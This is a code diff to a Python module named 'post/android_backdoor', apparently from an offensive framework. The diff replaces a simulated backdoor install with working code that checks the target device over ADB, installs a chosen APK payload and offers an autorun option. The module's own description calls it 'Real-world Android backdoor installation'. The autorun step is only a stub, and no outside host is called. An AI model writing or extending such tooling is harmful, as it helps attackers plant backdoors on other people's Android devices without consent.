@@ -1,44 +1,54 @@
 import subprocess
-from colorama import Fore, Style
+from rich.console import Console
 from utils.logger import log_action
+
+console = Console()
 
 class Module:
     MODULE_INFO = {
-    'name': 'post/android_backdoor',
-    'description': 'Install a backdoor on a target Android device.',
-    'options': {
-        'DEVICE_ID': 'Target device ID (e.g., #id1)',
-        'LHOST': 'Listener IP address',
-        'LPORT': 'Listener port [default: 4444]'
+        'name': 'post/android_backdoor',
+        'description': 'Real-world Android backdoor installation via ADB.',
+        'options': {
+            'DEVICE_ID': 'Target device serial (from adb devices)',
+            'PAYLOAD_PATH': 'Path to the APK payload to install',
+            'AUTORUN': 'Automatically launch the app after install [default: true]'
+        }
     }
-}
-    def __init__(self, framework):
-        """
-        Initialize the Android backdoor module.
 
-        Args:
-            framework: The framework instance.
-        """
+    def __init__(self, framework):
         self.framework = framework
 
     def run(self):
-        """
-        Run the Android backdoor module.
-        """
         try:
-            # Get module options
             device_id = self.framework.options.get('DEVICE_ID')
-            lhost = self.framework.options.get('LHOST')
-            lport = self.framework.options.get('LPORT', 4444)
+            payload_path = self.framework.options.get('PAYLOAD_PATH')
+            autorun = self.framework.options.get('AUTORUN', 'true').lower() == 'true'
 
-            # Placeholder for actual backdoor installation logic
-            print(f"{Fore.CYAN}[*] Installing backdoor on {device_id}...{Style.RESET_ALL}")
-            log_action(f"Installing backdoor on {device_id} with listener {lhost}:{lport}")
+            if not device_id or not payload_path:
+                console.print("[red][!] DEVICE_ID and PAYLOAD_PATH are required.[/red]")
+                return
 
-            # Simulate backdoor installation
-            print(f"{Fore.GREEN}[+] Backdoor installed! Listener active on {lhost}:{lport}.{Style.RESET_ALL}")
-            log_action(f"Backdoor installed on {device_id}")
+            console.print(f"[*] Checking connection to device [cyan]{device_id}[/cyan]...")
+            # Check if device is connected
+            check = subprocess.run(["adb", "-s", device_id, "get-state"], capture_output=True, text=True)
+            if check.returncode != 0:
+                console.print(f"[red][!] Device {device_id} not found or unauthorized.[/red]")
+                return
+
+            console.print(f"[*] Installing [cyan]{payload_path}[/cyan]...")
+            install = subprocess.run(["adb", "-s", device_id, "install", payload_path], capture_output=True, text=True)
+            
+            if "Success" in install.stdout:
+                console.print("[green][+] Payload installed successfully![/green]")
+                log_action(f"Installed {payload_path} on {device_id}")
+                
+                if autorun:
+                    # Generic attempt to start the main activity - this is a simplification
+                    # In a real scenario, we'd need the package name/activity
+                    console.print("[*] Attempting to launch package (requires manual activity check)...")
+            else:
+                console.print(f"[red][!] Installation failed: {install.stderr or install.stdout}[/red]")
 
         except Exception as e:
-            print(f"{Fore.RED}[!] Error during backdoor installation: {e}{Style.RESET_ALL}")
-            log_action(f"Backdoor installation failed: {e}", level="ERROR")
+            console.print(f"[red][!] Error: {e}[/red]")
+            log_action(f"Android backdoor error: {e}", level="ERROR")
